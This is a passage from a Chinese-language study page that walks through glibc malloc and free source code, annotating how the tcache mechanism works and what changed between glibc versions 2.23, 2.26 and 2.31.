class="hljs-comment">/* 每个线程都有一个这样的结构体，它包含了线程本地缓存</span><br><span class="hljs-comment">   （因此命名为 &quot;tcache_perthread_struct&quot;）。保持整体大小较小是较为重要的。</span><br><span class="hljs-comment">   注意，COUNTS 和 ENTRIES 是冗余的（我们本可以每次都遍历链表来计数），</span><br><span class="hljs-comment">   这是出于性能考虑。 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span>//每个线程的<span class="hljs-title">teache</span>数据结构</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<span class="hljs-comment">//记录每个bin中空闲chunk数量，TCACHE_MAX_BINS：tcache中最大bin数量</span><br>  tcache_entry *entries[TCACHE_MAX_BINS];<span class="hljs-comment">//每个元素是指向tcache_entry链表的指针</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">bool</span> tcache_shutting_down = <span class="hljs-literal">false</span>;<span class="hljs-comment">//用于标记当前线程的tcache是否正在关闭，初始false</span><br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//tcache的核心数据结构，存储当前线程的所有缓存信息，初始值NULL，表示tcache未初始化</span><br></code></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-comment">/* 调用者必须确保 tc_idx 是有效的，并且有空间存放更多的内存块。 */</span>   <span class="hljs-comment">//用于将内存块放入tcache</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><span class="hljs-comment">//chunk:内存块指针，tc_idx：内存块对应的tcache bin索引</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="hljs-comment">//强制转换类型以便作为链表的结点</span><br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="hljs-comment">//看看索引是否有效</span><br>  <span class="hljs-comment">//插入链表</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//将当前内存块指向链表的头部</span><br>  tcache-&gt;entries[tc_idx] = e;<span class="hljs-comment">//将链表头部更新为当前内存块</span><br>  ++(tcache-&gt;counts[tc_idx]);<span class="hljs-comment">//更新计数</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-comment">/* 调用者必须确保 tc_idx 是有效的，并且有可用的内存块可以移除。 */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><span class="hljs-comment">//用于从tcache中获取内存块</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//获取链表头部内存块地址</span><br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="hljs-comment">//检查索引是否有效</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<span class="hljs-comment">//检查是否有可用内存块</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="hljs-comment">//更新链表（相当于从链表移除内存块）</span><br>  --(tcache-&gt;counts[tc_idx]);<span class="hljs-comment">//更新计数</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<span class="hljs-comment">//返回内存块</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-malloc-1"><a href="#int-malloc-1" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">     can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);/</span><br><span class="hljs-comment">//原子操作，保证安全从fastbin中移除内存块</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<span class="hljs-comment">//单线程直接移除（更新fastbin链表头）</span><br>    *fb = victim-&gt;fd;<br>  <span class="hljs-keyword">else</span><span class="hljs-comment">//多线程，用上面那个宏安全移除</span><br>    REMOVE_FB (fb, pp, victim);<br>  <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>      <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>      check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//新加的，若启用tcache且其没满，就将fastbin中内存块移到tcache中</span></span><br>      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment"> stash them in the tcache.  */</span><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  mchunkptr tc_victim;<br><br>  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = tc_victim-&gt;fd;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>与2.23相比</p><ul><li>新加了<code>tcache</code>机制，提高性能（当从<code>fastbin</code>取出<code>chunk</code>时，若<code>tcache</code>没满且<code>fastbin</code>中还有<code>chunk</code>，就将<code>fastbin</code>中<code>chunk</code>移到<code>tcache</code>中）</li><li>新加判断是否是单线程，单线程与多线程不同的取出<code>chunk</code>的方式</li></ul><h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//移除内存块</span><br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          set_inuse_bit_at_offset (victim, nb);<br>          bin-&gt;bk = bck;<br>          bck-&gt;fd = bin;<br><br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<span class="hljs-comment">//非主分配区</span><br>    set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//新加的</span></span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<span class="hljs-comment">//移入tcache</span><br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>与2.23相比</p><ul><li>引入<code>tcache</code>，在分配<code>smallbins</code>后，若还有剩余块且<code>tcache</code>有空间，就将<code>smallbin</code>中的块移入<code>tcache</code></li><li>对<code>smallbins</code>未初始化就<code>malloc_consolidate</code>的机制进行移除</li></ul><p><strong>tcache_put的过程没对smallbin的完整性进行检查</strong></p><h3 id="largebin-1"><a href="#largebin-1" class="headerlink" title="largebin"></a>largebin</h3><p>没变</p><h3 id="大循环-1"><a href="#大循环-1" class="headerlink" title="大循环"></a>大循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//初始化tcache相关变量</span></span><br>  INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br>  <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>  tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>与2.23：</p><ul><li>新加了<code>tcache</code>相关变量初始化</li></ul><h3 id="unsorted-bin-2"><a href="#unsorted-bin-2" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>代码太长了，这里只选取新加的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment"> We may return one of these chunks later.  */</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="hljs-comment">//满足tcache</span><br>&#123;<br>  tcache_put (victim, tc_idx);<span class="hljs-comment">//放到tcache中</span><br>  return_cached = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在<code>unsortbin</code>遍历，如果符合<code>tcache</code>的条件（<code>tacche_nb</code>为真且<code>tcache</code>还没满），就将该内存块就放入<code>tcache</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>      ++tcache_unsorted_count;<span class="hljs-comment">//计数已经处理的内存块</span><br>      <span class="hljs-keyword">if</span> (return_cached<br>  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<span class="hljs-comment">//判断填没填满</span><br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>大致意思： 在处理 <code>unsorted bin</code> 中的内存块时，如果已经处理了足够多的内存块（用于填充<code> tcache</code>），则直接从 <code>tcache</code> 中返回一个内存块给用户。 </p><h2 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="libc_free"></a>libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX<br>  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  MAYBE_INIT_TCACHE ();<span class="hljs-comment">//多的</span><br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (__libc_free)<br></code></pre></td></tr></table></figure><p>主要变化就在38行，判断<code>TCACHE</code>初始化了没有，没有的话就初始化</p><h2 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<span class="hljs-comment">//更具内存块大小寻找索引</span><br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="hljs-comment">//检查tcache是否可用</span><br>      &#123;<br>tcache_put (p, tc_idx);<span class="hljs-comment">//放入tcache</span><br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>与2.23相比：</p><ul><li>在释放时如果<code>tcache</code>可用且未满，就会优先放入<code>tcache</code>中，优先级最高</li></ul><h3 id="fastbin-2"><a href="#fastbin-2" class="headerlink" title="fastbin"></a>fastbin</h3><p>在2.26及更高版本中 <code>free</code>时</p><ul><li>如果tcache没满，则当前释放的块会进入<code>tcache</code>，满了就放<code>fastbin</code></li><li><code>fastbin</code>中已经有的不会被转移</li></ul><h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h1><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>新增了<code>key</code>成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//组成单向链表</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><span class="hljs-comment">//检查是否double free</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><ul><li>增加了<code>key</code>成员，防止<code>double free</code></li></ul><h3 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>增加了第8行<code>e-&gt;key = tcache;</code>标记内存块以释放到<code>tcache</code>用于在后续的释放时检测<code>double free</code></p><h3 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>增加了第七行<code>e-&gt;key = NULL;</code>：清楚<code>key</code>字段，标记该内存块为”已从<code>tcache</code>中取出</p><h2 id="libc-malloc-2"><a href="#libc-malloc-2" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);<br></code></pre></td></tr></table></figure><p>断言（就是检查满不满足条件）， 用于确保 <code>PTRDIFF_MAX</code> 不超过 <code>SIZE_MAX</code> 的一半。 防止指针运算时发生溢出。（不过我没理解这话）</p><h2 id="int-malloc-2"><a href="#int-malloc-2" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!checked_request2size (bytes, &amp;nb))<br>  &#123;<br>    __set_errno (ENOMEM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>检查请求的大小是否合法，不合法就报错</p><h3 id="fastbin-3"><a href="#fastbin-3" class="headerlink" title="fastbin"></a>fastbin</h3><p>没变</p><h3 id="smallbin-1"><a href="#smallbin-1" class="headerlink" title="smallbin"></a>smallbin</h3><p>没变</p><h3 id="largebin-2"><a href="#largebin-2" class="headerlink" title="largebin"></a>largebin</h3><p>没变</p><h3 id="大循环-2"><a href="#大循环-2" class="headerlink" title="大循环"></a>大循环</h3><p>增加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 